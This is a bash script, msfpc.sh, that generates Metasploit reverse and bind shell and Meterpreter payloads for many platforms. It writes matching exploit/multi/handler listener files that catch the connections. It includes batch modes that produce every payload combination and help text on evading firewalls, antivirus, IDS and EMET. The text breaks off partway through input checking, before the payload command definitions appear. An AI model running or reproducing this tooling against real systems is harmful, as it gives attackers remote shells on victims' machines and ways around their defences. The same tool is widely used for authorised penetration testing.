#!/bin/bash
#-Metadata----------------------------------------------------#
#  Filename: msfpc.sh (v1.4.5)           (Update: 2019-02-18) #
#-Info--------------------------------------------------------#
#  Quickly generate Metasploit payloads using msfvenom.       #
#-Author(s)---------------------------------------------------#
#  g0tmilk ~ https://blog.g0tmi1k.com/                        #
#-Operating System--------------------------------------------#
#  Designed for & tested on: Kali Rolling & Metasploit v4.11+ #
#          Reported working: OSX 10.11+ & Kali Linux 1.x/2.x  #
#-Licence-----------------------------------------------------#
#  MIT License ~ http://opensource.org/licenses/MIT           #
#-Notes-------------------------------------------------------#
#  Requires:                                                  #
#    Metasploit Framework v4.11.3-2015062101 or higher        #
#                             ---                             #
#  Useful Manual Commands:                                    #
#    msfvenom --list payloads                                 #
#    msfvenom --list encoders                                 #
#    msfvenom --help-formats                                  #
#                             ---                             #
#  Reminder about payload names:                              #
#    shell_bind_tcp - Single / Inline / NonStaged / Stageless #
#    shell/bind_tcp - Staged (Requires Metasploit)            #
#-Known Bugs--------------------------------------------------#
# [BATCH/LOOP] The script must have the executable flag set   #
# [BATCH] Will not generate DLL files                         #
#-------------------------------------------------------------#

#--Quick Install----------------------------------------------#
#  curl -k -L "https://raw.githubusercontent.com/g0tmi1k/msfpc/master/msfpc.sh" > /usr/bin/msfpc; chmod +x /usr/bin/msfpc
#-------------------------------------------------------------#

#-More information--------------------------------------------#
#   - https://www.offensive-security.com/metasploit-unleashed/payloads/
#   - https://www.offensive-security.com/metasploit-unleashed/payload-types/
#   - https://www.offensive-security.com/metasploit-unleashed/msfvenom/
#   - https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads
#   - https://community.rapid7.com/community/metasploit/blog/2011/05/24/introducing-msfvenom
#   - https://community.rapid7.com/community/metasploit/blog/2014/12/09/good-bye-msfpayload-and-msfencode
#   - https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom
#-------------------------------------------------------------#


#-Defaults----------------------------------------------------#


##### Variables
OUTPATH="$( pwd )/"      # Others: ./   /tmp/   /var/www/

##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success/Asking for Input
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal

##### Read command line arguments
TYPE=""                #"$( echo ${1} | \tr '[:upper:]' '[:lower:]' )" Defalut: *REQUIRED*
IP=""                  #"${2}"                                         Defalut: *IP menu*
PORT=""                #"${3}"                                         Deafult: 443
SHELL=""               # shell // meterpreter                          Default: meterpreter
DIRECTION=""           # reverse // bind                               Default: reverse
STAGE=""               # staged // stageless                           Default: stageless
METHOD=""              # tcp // http // https // find_port             Default: tcp
VERBOSE=false

##### Default values
SUCCESS=false          # Did we successfully create a payload?
DOMAIN=false           # IP address or domain name?
BATCH=false            # Are we creating multiple payloads (one of each type) ?
LOOP=false             # Are we creating multiple payloads (every possible combination)?
HELP=false             # Display the help screen?
DARWIN=false           # In case of OSX users

##### (Optional) Enable debug mode?
#set -x


#-Function----------------------------------------------------#

## doAction TYPE IP PORT PAYLOAD CMD FILEEXT SHELL DIRECTION STAGE METHOD VERBOSE
function doAction {
  TYPE="${1}"
  IP="${2}"
  PORT="${3}"
  PAYLOAD="${4}"
  CMD="${5}"
  FILEEXT="${6%-service}"
  SHELL="${7}"
  DIRECTION="${8}"
  STAGE="${9}"
  METHOD="${10}"
  VERBOSE="${11}"

  if [[ -z "${VERBOSE}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${RED}Something went wrong (Internally)${RESET}:   doAction TYPE(${TYPE}) IP(${IP}) PORT(${PORT}) PAYLOAD(${PAYLOAD}) CMD(${CMD}) FILEEXT(${FILEEXT}) SHELL(${SHELL}) DIRECTION(${DIRECTION}) STAGE(${STAGE}) METHOD(${METHOD}) VERBOSE(${VERBOSE})" >&2
    exit 2
  fi

  FILENAME="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}.${FILEEXT}"
  FILEHANDLE="${OUTPATH}${TYPE}-${SHELL}-${STAGE}-${DIRECTION}-${METHOD}-${PORT}-${FILEEXT}.rc"

  X="  IP"
  [[ "${DOMAIN}" == "true" ]] \
    && X='NAME'
  [[ "${VERBOSE}" == "true" ]] \
    && PADDING='     '

  echo -e " ${YELLOW}[i]${RESET}${PADDING} ${X}: ${YELLOW}${IP}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING} PORT: ${YELLOW}${PORT}${RESET}"
  echo -e " ${YELLOW}[i]${RESET}${PADDING} TYPE: ${YELLOW}${TYPE}${RESET} (${PAYLOAD})"
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e " ${YELLOW}[i]${RESET}     SHELL: ${YELLOW}${SHELL}${RESET}"
    echo -e " ${YELLOW}[i]${RESET} DIRECTION: ${YELLOW}${DIRECTION}${RESET}"
    echo -e " ${YELLOW}[i]${RESET}     STAGE: ${YELLOW}${STAGE}${RESET}"
    echo -e " ${YELLOW}[i]${RESET}    METHOD: ${YELLOW}${METHOD}${RESET}"
  fi
  echo -e " ${YELLOW}[i]${RESET}${PADDING}  CMD: ${BOLD}${CMD}${RESET}"
  echo ""

  CMD=$( echo $CMD | sed 's/\\\\\n//g' )

  [[ -e "${FILENAME}" ]] \
    && echo -e " ${YELLOW}[i]${RESET} File (${FILENAME}) ${YELLOW}already exists${RESET}. ${YELLOW}Overwriting...${RESET}" \
    && rm -f "${FILENAME}"
  eval "${CMD}" 2>/tmp/msfpc.out
  [[ ! -s "${FILENAME}" ]] \
    && rm -f "${FILENAME}"
  if [[ -e "${FILENAME}" ]]; then
    echo -e " ${YELLOW}[i]${RESET} ${TYPE} ${SHELL} created: '${YELLOW}${FILENAME}${RESET}'"
    echo ""
    \chmod +x "${FILENAME}"
  else
    echo ""
    \grep -q 'Invalid Payload Selected' /tmp/msfpc.out 2>/dev/null
    if [[ "$?" == '0'  ]]; then
      echo -e "\n ${YELLOW}[i]${RESET} ${RED}Invalid Payload Selected${RESET} (Metasploit doesn't support this) =(" >&2
      \rm -f /tmp/msfpc.out
    else
      echo -e "\n ${YELLOW}[i]${RESET} Something went wrong. ${RED}Issue creating file${RESET} =(." >&2
      echo -e "\n----------------------------------------------------------------------------------------"
      [ -e "/usr/share/metasploit-framework/build_rev.txt" ] \
        && \cat /usr/share/metasploit-framework/build_rev.txt \
        || \msfconsole -v
      \uname -a
      echo -e "----------------------------------------------------------------------------------------${RED}"
      \cat /tmp/msfpc.out
      echo -e "${RESET}----------------------------------------------------------------------------------------\n"
    fi
    exit 2
  fi
  #\rm -f /tmp/msfpc.out

  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e " ${YELLOW}[i]${RESET} File: $( \file -b ${FILENAME} )"
    echo -e " ${YELLOW}[i]${RESET} Size: $( \du -h ${FILENAME} | \cut -f1 )"
    echo -e " ${YELLOW}[i]${RESET}  MD5: $( \openssl md5 ${FILENAME} | \awk '{print $2}' )"
    echo -e " ${YELLOW}[i]${RESET} SHA1: $( \openssl sha1 ${FILENAME} | \awk '{print $2}' )"
    echo -e ""
  fi

  HOST="LHOST"
  [[ "${DIRECTION}" == "bind" ]] \
    && HOST="RHOST"

  cat <<EOF > "${FILEHANDLE}"
#
# [Kali]: msfdb start; msfconsole -q -r '${FILEHANDLE}'
#
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set ${HOST} ${IP}
set LPORT ${PORT}
set ExitOnSession false
set EnableStageEncoding true
#set AutoRunScript 'post/windows/manage/migrate'
run -j
EOF

  echo -e " ${YELLOW}[i]${RESET} MSF handler file: '${FILEHANDLE}'"
  echo -e " ${YELLOW}[i]${RESET} Run: msfconsole -q -r '${FILEHANDLE}'"
  #echo -e " ${YELLOW}[i]${RESET} MSF command: msfconsole -x \"use exploit/multi/handler; \\\\\n  set PAYLOAD ${PAYLOAD}; \\\\\n  set ${HOST} ${IP}; \\\\\n  set LPORT ${PORT}; \\\\\n  set ExitOnSession false; \\\\\n  run -j\""
  SUCCESS=true
  return
}

## doHelp
function doHelp {
  echo -e "\n ${BLUE}${0}${RESET} <${BOLD}TYPE${RESET}> (<${BOLD}DOMAIN/IP${RESET}>) (<${BOLD}PORT${RESET}>) (<${BOLD}CMD/MSF${RESET}>) (<${BOLD}BIND/REVERSE${RESET}>) (<${BOLD}STAGED/STAGELESS${RESET}>) (<${BOLD}TCP/HTTP/HTTPS/FIND_PORT${RESET}>) (<${BOLD}BATCH/LOOP${RESET}>) (<${BOLD}VERBOSE${RESET}>)"
  echo -e "   Example: ${BLUE}${0} windows 192.168.1.10${RESET}        # Windows & manual IP."
  echo -e "            ${BLUE}${0} elf bind eth0 4444${RESET}          # Linux, eth0's IP & manual port."
  echo -e "            ${BLUE}${0} stageless cmd py https${RESET}      # Python, stageless command prompt."
  echo -e "            ${BLUE}${0} verbose loop eth1${RESET}           # A payload for every type, using eth1's IP."
  echo -e "            ${BLUE}${0} msf batch wan${RESET}               # All possible Meterpreter payloads, using WAN IP."
  echo -e "            ${BLUE}${0} help verbose${RESET}                # Help screen, with even more information."
  echo ""
  echo -e " <${BOLD}TYPE${RESET}>:"
  echo -e "   + ${YELLOW}APK${RESET}"
  echo -e "   + ${YELLOW}ASP${RESET}"
  echo -e "   + ${YELLOW}ASPX${RESET}"
  echo -e "   + ${YELLOW}Bash${RESET} [.${YELLOW}sh${RESET}]"
  echo -e "   + ${YELLOW}Java${RESET} [.${YELLOW}jsp${RESET}]"
  echo -e "   + ${YELLOW}Linux${RESET} [.${YELLOW}elf${RESET}]"
  echo -e "   + ${YELLOW}OSX${RESET} [.${YELLOW}macho${RESET}]"
  echo -e "   + ${YELLOW}Perl${RESET} [.${YELLOW}pl${RESET}]"
  echo -e "   + ${YELLOW}PHP${RESET}"
  echo -e "   + ${YELLOW}Powershell${RESET} [.${YELLOW}ps1${RESET}]"
  echo -e "   + ${YELLOW}Python${RESET} [.${YELLOW}py${RESET}]"
  echo -e "   + ${YELLOW}Tomcat${RESET} [.${YELLOW}war${RESET}]"
  echo -e "   + ${YELLOW}Windows${RESET} [.${YELLOW}exe${RESET} // .${YELLOW}exe-service${RESET} // .${YELLOW}dll${RESET}]"
  echo ""
  echo -e " Rather than putting <DOMAIN/IP>, you can do a interface and MSFPC will detect that IP address."
  echo -e " Missing <DOMAIN/IP> will default to the IP menu."
  echo ""
  echo -e " Missing <PORT> will default to 443."
  echo ""
  echo -e " <CMD> is a standard/native command prompt/terminal to interactive with."
  echo -e " <MSF> is a custom cross platform shell, gaining the full power of Metasploit."
  echo -e " Missing <CMD/MSF> will default to <MSF> where possible."
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e "   Note: Metasploit doesn't (yet!) support <CMD/MSF> for every <TYPE> format."
    echo -e " <CMD> payloads are generally smaller than <MSF> and easier to bypass EMET. Limit Metasploit post modules/scripts support."
    echo -e " <MSF> payloads are generally much larger than <CMD>, as it comes with more features."
  fi
  echo ""
  echo -e " <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target."
  echo -e " <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target."
  echo -e " Missing <BIND/REVERSE> will default to <REVERSE>."
  [[ "${VERBOSE}" == "true" ]] \
    && echo -e " <BIND> allows for the attacker to connect whenever they wish. <REVERSE> needs to the target to be repeatedly connecting back to permanent maintain access."
  echo ""
  echo -e " <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit."
  echo -e " <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>."
  echo -e " Missing <STAGED/STAGELESS> will default to <STAGED> where possible."
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e "   Note: Metasploit doesn't (yet!) support <STAGED/STAGELESS> for every <TYPE> format."
    echo -e " <STAGED> are 'better' in low-bandwidth/high-latency environments."
    echo -e " <STAGELESS> are seen as 'stealthier' when bypassing Anti-Virus protections. <STAGED> may work 'better' with IDS/IPS."
    echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2015/03/25/stageless-meterpreter-payloads"
    echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payload-types/"
    echo -e "                   https://www.offensive-security.com/metasploit-unleashed/payloads/"
  fi
  echo ""
  echo -e " <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs."
  echo -e " <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80."
  echo -e " <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443."
  echo -e " <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>."
  echo -e " Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>."
  if [[ "${VERBOSE}" == "true" ]]; then
    echo -e " By altering the traffic, such as <HTTP> and even more <HTTPS>, it will slow down the communication & increase the payload size."
    echo -e " More information: https://community.rapid7.com/community/metasploit/blog/2011/06/29/meterpreter-httphttps-communication"
  fi
  echo ""
  echo -e " <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGELESS> & <TCP + HTTP + HTTPS + FIND_PORT> "
  echo -e " <LOOP> will just create one of each <TYPE>."
  echo ""
  echo -e " <VERBOSE> will display more information."
  exit 1
}


#-Start-------------------------------------------------------#


## Banner
echo -e " ${BLUE}[*]${RESET} ${BLUE}MSF${RESET}venom ${BLUE}P${RESET}ayload ${BLUE}C${RESET}reator (${BLUE}MSFPC${RESET} v${BLUE}1.4.5${RESET})"


## Check system
## Are we using Linux or OSX?
if [[ "$( \uname )" != "Linux" ]] && [[ "$( \uname )" != "Darwin" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}You're not using Unix-like OS${RESET}" >&2
  exit 3
elif [[ "$( \uname )" = "Darwin" ]]; then
  DARWIN=true
fi

## msfvenom installed?
if [[ ! -n "$( \which msfvenom )" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find msfvenom${RESET}" >&2
  exit 3
fi

## cURL/wget installed?
if [[ -n "$( \which curl )" || -n "$( \which wget )" ]]; then
  ## Try and get external IP
  WAN=""
  [[ -n "$( \which curl )" ]] \
    && CMD="\curl -s --max-time 3" \
    || CMD="\wget -U 'curl' --connect-timeout 3 -qO-"
  for url in 'http://ipinfo.io/ip' 'http://ifconfig.io/'; do
    WAN=$( eval ${CMD} "${url}" )
    [[ -n "${WAN}" ]] \
      && break
  done
  [[ "${VERBOSE}" == "true" && -z "${WAN}" ]] \
    && echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't get external WAN IP${RESET}" >&2
fi

## Is there a writeable path for us?
if [[ ! -d "${OUTPATH}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Unable to use ${OUTPATH}${RESET}" >&2
  exit 3
fi


## Get default values (before batch/loop)
[[ -z "${PORT}" ]] \
  && PORT="443"

## Get NIC information
if [[ "$DARWIN" = "true" ]]; then   # OSX users
  IFACE=( $( for IFACE in $( \ifconfig -l -u | \tr ' ' '\n' ); do if ( \ifconfig ${IFACE} | \grep inet 1>/dev/null ); then echo ${IFACE}; fi; done ) )
  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \ifconfig "${IFACE[${i}]}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}' ) ); done
else    # nix users
  IFACE=( $( \awk '/:/ {print $1}' /proc/net/dev | \sed 's_:__' ) )
  IPs=(); for (( i=0; i<${#IFACE[@]}; ++i )); do IPs+=( $( \ip addr list "${IFACE[${i}]}" | \grep 'inet ' | \cut -d' ' -f6 | \cut -d '/' -f1 ) ); done
fi

## Define TYPEs/FORMATs
TYPEs=(  apk   asp  aspx  bash  java  linux    osx    perl  php  powershell python  tomcat  windows )   # Due to how its coded, this must always be a higher array count than ${FORMATs}
FORMATs=(                 sh    jsp   lin elf  macho  pl         ps1        py      war     win exe exe-service dll )


## Check user input
## Able to detect NIC interfaces?
if [[ -z "${IFACE}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't find any network interfaces${RESET}" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define an IP.   ${YELLOW}${0} --ip <IP>${RESET}" >&2
  exit 2
fi

## Able to detect IP addresses?
if [[ -z "${IPs}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Something went wrong. ${RED}Couldn't discover IP addresses${RESET}. =(" >&2
  echo -e " ${YELLOW}[i]${RESET} Need to manually define it.   ${YELLOW}${0} --ip <IP>${RESET}" >&2
  exit 2
fi

## (!!!Magic Alert!!!) Try to predict what's what with inputs...
for x in $( \tr '[:upper:]' '[:lower:]' <<< "$@" ); do
    if [[ "${x}" =~ ^--* ]]; then true                                                                                                        # Long argument? (skip!)
  elif [[ "${x}" == "list" || "${x}" == "ls" || "${x}" == "options" || "${x}" == "show" || "${x}" == "help" ]]; then HELP=true                # List types? (aka help screen)
  elif [[ "${x}" == "verbose" || "${x}" == "v" ]]; then VERBOSE=true                                                                          # Verbose?
  elif [[ "${x}" == "all" || "${x}" == "batch" || "${x}" == "a" ]]; then BATCH=true                                                           # Batch mode?
  elif [[ "${x}" == "loop" || "${x}" == "l" ]]; then LOOP=true                                                                                # Loop mode?
  elif [[ "${x}" == "cmd" || "${x}" == "shell" || "${x}" == "normal" ]]; then SHELL="shell"                                                   # Shell?
  elif [[ "${x}" == "meterpreter" || "${x}" == "msf" || "${x}" == "meterp" ]]; then SHELL="meterpreter"                                       # Meterpreter?
  elif [[ "${x}" == "bind" || "${x}" ==  "listen" ]]; then DIRECTION="bind"                                                                   # Bind payload?
  elif [[ "${x}" == "reverse" || "${x}" == "rev" ]]; then DIRECTION="reverse"                                                                 # Reverse payload? (default)
  elif [[ "${x}" == "staged" || "${x}" == "stager" || "${x}" == "stage" || "${x}" == "small" ]]; then STAGE=true                              # Staged?
  elif [[ "${x}" == "stag"*"less" || "${x}" == "single" || "${x}" == "inline" || "${x}" == "no"* || "${x}" == "full" ]]; then STAGE=false     # Stageless?
  elif [[ "${x}" == "https" || "${x}" == "ssl" || "${x}" == "tls" ]]; then METHOD="https"                                                     # HTTPS payload?
  elif [[ "${x}" == "http" || "${x}" == "www" ]]; then METHOD="http"                                                                          # HTTP payload?
  elif [[ "${x}" == "tcp" ]]; then METHOD="tcp"                                                                                               # TCP payload? (default)
  elif [[ "${x}" == "find"* || "${x}" == "allport"* ]]; then METHOD="find_port"                                                               # Find_Port payload?
  elif [[ "${x}" =~ ^-?[0-9]+$ && "${x}" -gt 1 && "${x}" -lt 65535 ]]; then PORT="${x}"                                                       # Port?
  elif [[ "${x}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then IP="${x}"                                            # IP?
  elif [[ "${x}" == *.* ]]; then IP="${x}"                                                                                                    # Domain/DNS? (weak detection & doesn't support hostname)
  elif [[ "${x}" == "wan" && -n "${WAN}" ]]; then IP="${WAN}"                                                                                 # WAN interface?
  else
    known=false
    for (( i=0; i<${#IFACE[@]}; ++i )); do [[ "${x}" == "${IFACE[${i}]}" ]] && IP="${IPs[${i}]}" && known=true && break; done                 # Interface? (rather than a an IP)
    for (( i=0; i<${#TYPEs[@]}; ++i )); do [[ "${x}" == "${TYPEs[${i}]}" ]] && TYPE="${TYPEs[${i}]}" && known=true && break; done             # Type?
    for (( i=0; i<${#FORMATs[@]}; ++i )); do [[ "${x}" == "${FORMATs[${i}]}" ]] && TYPE="${FORMATs[${i}]}" && known=true && break; done       # Type? (aka formats)
    [[ "${known}" == false ]] \
      && echo -e " ${YELLOW}[i]${RESET} Unable to detect value: ${RED}${x}${RESET}" \
      && exit 1                         # ...if we got this far, we failed. =(
  fi
done

## If the user defined a value, overwrite it regardless
while [[ "${#}" -gt 0 && ."${1}" == .-* ]]; do
  opt="${1}";
  shift;
  case "$( echo ${opt} | tr '[:upper:]' '[:lower:]' )" in
    -|-- ) break 2;;

    -p|--platform )
       TYPE="${1}"; shift;;
    --platform=* )
       TYPE="${opt#*=}";;
    -t|--type )
       TYPE="${1}"; shift;;
    --type=* )
       TYPE="${opt#*=}";;

    -i|--ip )
       IP="${1}"; shift;;
    --ip=* )
       IP="${opt#*=}";;

    -p|--port )
       PORT="${1}"; shift;;
    --port=* )
       PORT="${opt#*=}";;

    -m|--msf|--meterpreter )
       SHELL="meterpreter";;
    -c|--cmd|--shell )
       SHELL="shell";;
    --shell )
       SHELL="${1}"; shift;;
    --shell=* )
       SHELL="${opt#*=}";;

    -b|--bind|--listen )
       DIRECTION="bind";;
    -r|--rev|--reverse )
       DIRECTION="reverse";;
    --direction )
       DIRECTION="${1}"; shift;;
    --direction=* )
       DIRECTION="${opt#*=}";;

    -s|--staged|--stager )
       STAGE=true;;
    --stageless )
       STAGE=false;;
    --stage )
       STAGE="${1}"; shift;;
    --stage=* )
       STAGE="${opt#*=}";;

    -t|--tcp )
       METHOD="tcp";;
    --http|--www )
       METHOD="http";;
    --https|--ssl|--tls )
       METHOD="https";;
    -f|--find|--all|--find_port|--find-port|--findport|--allports|--all-ports|--all_ports )
       METHOD="find_port";;
    --method )
       METHOD="${1}"; shift;;
    --method=* )
       METHOD="${opt#*=}";;

    -a|--all|--batch )
       BATCH=true;;
    -l|--loop )
       LOOP=true;;

    -v|--verbose )
       VERBOSE=true;;

    -h|--help|-ls|--list|--options )
       HELP=true;;

    *) echo -e " ${YELLOW}[i]${RESET} Invalid option: ${RED}${x}${RESET}" && exit 1;;
   esac
done


## Display help?
[[ "${HELP}" == true ]] \
  && doHelp


## Check input
  if [[ "${SHELL}" == "shell" || "${SHELL}" == "cmd" || "${SHELL}" == "normal" ]]; then SHELL="shell"
elif [[ "${SHELL}" == "meterpreter" || "${SHELL}" == "msf" || "${SHELL}" == "meterp" ]]; then SHELL="meterpreter"; fi
#else SHELL="meterpreter"; fi   # <--- cant due to batch mode (same with [[ -z "${SHELL}" ]])

  if [[ "${DIRECTION}" == "reverse" || "${DIRECTION}" == "rev" ]]; then DIRECTION="reverse"
elif [[ "${DIRECTION}" == "bind" || "${DIRECTION}" == "listen" ]]; then DIRECTION="bind"; fi

  if [[ "${STAGE}" == "true" || "${STAGE}" == "staged" || "${STAGE}" == "stager" || "${STAGE}" == "stage" || "${STAGE}" == "small" ]]; then STAGE='staged'; _STAGE='/'
elif [[ "${STAGE}" == "false" || "${STAGE}" == "stage"*"less" || "${STAGE}" == "single" || "${STAGE}" == "inline" || "${STAGE}" == "no"* || "${STAGE}" == "full" ]]; then STAGE='stageless'; _STAGE='_'; fi

  if [[ "${METHOD}" == "tcp" ]]; then METHOD="tcp"
elif [[ "${METHOD}" == "http" || "${METHOD}" == "www" ]]; then METHOD="http"
elif [[ "${METHOD}" == "https" || "${METHOD}" == "tls" || "${METHOD}" == "ssl" ]]; then METHOD="https"
elif [[ "${METHOD}" == "find"* || "${METHOD}" == "all"* ]]; then METHOD="find_port"; fi

## Did user enter an interface instead of an IP address?
for (( x=0; x<${#IFACE[@]}; ++x )); do [[ "${IP}" == "${IFACE[${x}]}" ]] && IP=${IPs[${x}]} && break; done

## WAN interface?
if [[ -n "${WAN}" && "${IP}" == "${WAN}" ]]; then
  [[ "${VERBOSE}" == "true" ]] \
    && echo -e " ${YELLOW}[i]${RESET} WAN IP: ${YELLOW}${WAN}${RESET}  "
fi

## Valued entered for IP address? Is it a valid IPv4 address? Else assume its a domain...
if [[ "${IP}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
  for (( i=1; i<${#BASH_REMATCH[@]}; ++i )); do
    (( ${BASH_REMATCH[${i}]} <= 255 )) || { echo -e " ${YELLOW}[i]${RESET} IP (${IP}) appears to be a ${RED}invalid IPv4 address${RESET} =(" >&2 && exit 3; }
  done
elif [[ -n "${IP}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} ${IP} isn't a IPv4 address. ${YELLOW}Assuming its a domain name${RESET}..."
  DOMAIN=true
fi

## Valid port?
if [[ "${PORT}" -lt 1 || "${PORT}" -gt 65535 ]]; then
  echo -e " ${YELLOW}[i]${RESET} PORT (${PORT}) is incorrect. Needs to be ${YELLOW}between 1-65535${RESET}" >&2
  exit 3
fi


## IP menu
if [[ -n "${TYPE}" && -z "${IP}" ]]; then
  echo -e "\n ${YELLOW}[i]${RESET} Use which ${BLUE}interface${RESET} - ${YELLOW}IP address${RESET}?:"
  I=0
  for iface in "${IFACE[@]}"; do
    IPs[${I}]="$( \ifconfig "${iface}" | \grep 'inet ' | \grep -E '([[:digit:]]{1,2}.){4}' | \sed -e 's_[:|addr|inet]__g; s_^[ \t]*__' | \awk '{print $1}' )"
    [[ -z "${IPs[${I}]}" ]] \
      && IPs[${I}]="$( \ifconfig "${iface}" | \grep 'inet addr:' | \cut -d':' -f2 | \cut -d' ' -f1 )"
    [[ -z "${IPs[${I}]}" ]] \
      && IPs[${I}]="UNKNOWN"
    echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}+1]${RESET}.) ${BLUE}${iface}${RESET} - ${YELLOW}${IPs[${I}]}${RESET}"
    I=$[${I}+1]
  done
  [[ -n "${WAN}" ]] \
    && I=$[${I}+1] \
    && echo -e " ${YELLOW}[i]${RESET}   ${GREEN}$[${I}]${RESET}.) ${BLUE}wan${RESET} - ${YELLOW}${WAN}${RESET}"
  _IP=""
  while [[ -z "${_IP}" ]]; do
    echo -ne " ${YELLOW}[?]${RESET} Select ${GREEN}1-${I}${RESET}, ${BLUE}interface${RESET} or ${YELLOW}IP address${RESET}"; read -p ": " INPUT
    for (( x=0; x<${I}; ++x )); do [[ "${INPUT}" == "${IFACE[${x}]}" ]] && _IP="${IPs[${x}]}"; done           # Did user enter interface?
    [[ -n "${WAN}" && "${INPUT}" == "${INPUT}" ]] && _IP="${WAN}"                                             # Did user enter wan?
    [[ "${INPUT}" != *"."* && "${INPUT}" -ge 1 && "${INPUT}" -le "${I}" ]] && _IP="${IPs[${INPUT}-1]}"        # Did user select number?
    #for ip in "${IPs[@]}"; do [[ "${INPUT}" == "${ip}" ]] && _IP="${ip}"; done                               # Did user enter a known IP?
    [[ "${INPUT}" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]] && _IP="${INPUT}"         # Did the user enter a IP address (doesn't valid it)
    IP="${_IP}"
  done
  echo ""
fi


## Generate #1 (Batch/Looping)
## Loop mode?
if [[ "${LOOP}" == "true" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Loop Mode. ${BOLD}Creating one of each TYPE${RESET}, with default values"
  [[ "${VERBOSE}" == "true" ]] \
    && _VERBOSE="verbose"
  for (( i=0; i<${#TYPEs[@]}; ++i )); do
    echo ""   # "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"
    eval "${0}" "${TYPEs[${i}]}" "${IP}" "${PORT}" "${_VERBOSE}"   # chmod +x ${0}
    echo ""
  done   # for TYPEs[@]
  echo ""
  eval "${0}" "dll" "${IP}" "${PORT}" "${_VERBOSE}"   #... the odd one out!
  echo ""
elif [[ "${BATCH}" == "true" ]]; then
  echo -e " ${YELLOW}[i]${RESET} Batch Mode. ${BOLD}Creating as many different combinations as possible${RESET}"
  [[ "${VERBOSE}" == "true" ]] \
    && _VERBOSE="verbose"
  for (( i=0; i<${#TYPEs[@]}; ++i )); do
  if [[ -z "${TYPE}" || "${TYPEs[${i}]}" == "${TYPE}" || "${FORMATs[${i}]}" == "${TYPE}" ]]; then
    type="${TYPEs[${i}]}"
    [[ -n "${TYPE}" && "${FORMATs[${i}]}" == "${TYPE}" ]] && type="${FORMATs[${i}]}"
    for shell in "meterpreter" "shell"; do
    if [[ -z "${SHELL}" || "${shell}" == "${SHELL}" ]]; then
      for direction in "reverse" "bind"; do
      if [[ -z "${DIRECTION}" || "${direction}" == "${DIRECTION}" ]]; then
        for staged in "staged" "stageless"; do
        if [[ -z "${STAGE}" || "${staged}" == "${STAGE}" ]]; then
          for method in "tcp" "http" "https" "find_port"; do
          if [[ -z "${METHOD}" || "${method}" == "${METHOD}" ]]; then
            echo ""   # "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"
            eval "${0}" "${type}" "${IP}" "${PORT}" "${direction}" "${staged}" "${method}"  "${shell}" "${_VERBOSE}"    # chmod +x ${0}
            echo ""
          fi        # "${method}" == "${METHOD}"
          done      # for protocol
        fi        # "${staged}" == "${STAGE}"
        done      # for staged
      fi        # "${direction}" == "${DIRECTION}"
      done      # for direction
    fi        # "${shell}" == "${SHELL}"
    done      # for shell
    echo -e "\n"
  fi        # "${TYPEs[${i}]}" == "${TYPE}"
  done      # for TYPEs[@]
fi


## Set default values (after batch/loop)
[[ -z "${METHOD}" ]] \
  && METHOD="tcp"
[[ -z "${DIRECTION}" ]] \
  && DIRECTION="reverse"

## Valid shell?
if [[ -n "${TYPE}" && "${SHELL}" != "shell" && "${SHELL}" != "meterpreter" && -n "${SHELL}" ]]; then
  echo -e " ${YELLOW}[i]${RESET} SHELL (${SHELL}) is incorrect. Needs to be either ${YELLOW}shell${RESET} or ${YELLOW}meterpreter${RESET}" >&2
  exit 3
fi

## Valid staged?
